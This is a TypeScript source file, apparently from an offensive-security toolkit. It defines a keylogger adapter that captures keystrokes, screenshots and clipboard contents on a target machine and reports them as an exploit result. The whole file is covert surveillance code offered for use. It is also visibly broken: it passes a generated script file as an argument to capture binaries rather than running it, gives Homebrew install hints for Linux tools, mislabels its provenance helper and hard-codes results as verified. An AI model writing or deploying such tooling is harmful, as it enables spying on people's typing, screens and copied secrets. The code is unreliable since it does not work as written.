/**
 * OffSec by True Hacking — Adapter: Keylogger (screenshot + keystroke capture).
 *
 * Runs keylogger (capture keystrokes, screenshots, clipboard) on target.
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Keylogger (screenshot + keystroke capture).
 *
 * @param options - Keylogger options (target, screenshot, keystrokes).
 */
export function keylogger(options: {
  target: string;
  actions?: string[];  // screenshot, keystroke, clipboard
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const actions = options.actions || [];
  const results: Record<string, any> = {};

  // Screenshot (take screenshot on target).
  if (actions.includes("screenshot")) {
    const scPath = findBinary("scrot") || findBinary("screenshot");
    if (scPath) {
      const commands = [`${scPath} -d 5 /tmp/screenshot.png`];  // (capture after 5s).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(scPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.screenshot = String(child.stdout ?? "");
    } else {
      results.screenshot = `{stub: no 'scrot' or 'screenshot' binary (install: brew install scrot).}`;
    }
  }

  // Keystroke (capture keystrokes on target).
  if (actions.includes("keystroke")) {
    const keysPath = findBinary("keylogger");
    if (keysPath) {
      const commands = [`keylogger -target ${target}`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(keysPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.keystroke = String(child.stdout ?? "");
    } else {
      results.keystroke = `{stub: no 'keylogger' binary (install: keylogger package).}`;
    }
  }

  // Clipboard (capture clipboard content on target).
  if (actions.includes("clipboard")) {
    const clipPath = findBinary("xclip");
    if (clipPath) {
      const commands = [`xclip -o > /tmp/clipboard.txt`];  // (capture clipboard).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(clipPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.clipboard = String(child.stdout ?? "");
    } else {
      results.clipboard = `{stub: no 'xclip' binary (install: brew install xclip).}`;
    }
  }

  return {
    target,
    payload: `keylogger/${actions.join(",")}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("keylogger", `keylogger://${target}/${actions.join(",")}`),
  };
}

/** Find the binary (scrot/screenshot/keylogger/xclip). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
